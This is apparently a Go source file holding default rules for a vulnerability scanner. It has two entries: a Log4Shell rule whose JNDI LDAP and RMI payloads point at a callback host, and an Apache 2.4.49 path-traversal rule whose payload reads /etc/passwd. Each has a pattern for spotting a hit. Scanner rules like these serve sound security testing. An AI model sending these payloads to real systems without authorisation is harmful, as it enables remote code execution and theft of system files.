package scan

// DefaultVulnRules 默认漏洞规则
var DefaultVulnRules = []*VulnRule{
    {
        ID:          "CVE-2021-44228",
        Name:        "Log4j RCE",
        Description: "Apache Log4j2 远程代码执行漏洞",
        Severity:    "critical",
        Category:    "rce",
        Service:     "http",
        Payloads: []string{
            "${jndi:ldap://{{callback}}/a}",
            "${jndi:rmi://{{callback}}/a}",
        },
        Patterns: []string{
            `Exception.*javax\.naming`,
        },
    },
    {
        ID:          "CVE-2021-41773",
        Name:        "Apache Path Traversal",
        Description: "Apache HTTP Server 2.4.49 路径穿越漏洞",
        Severity:    "high",
        Category:    "path-traversal",
        Service:     "http",
        Payloads: []string{
            "/cgi-bin/.%2e/%2e%2e/etc/passwd",
        },
        Patterns: []string{
            `root:.*:0:0:`,
        },
    },
    // 添加更多漏洞规则
} 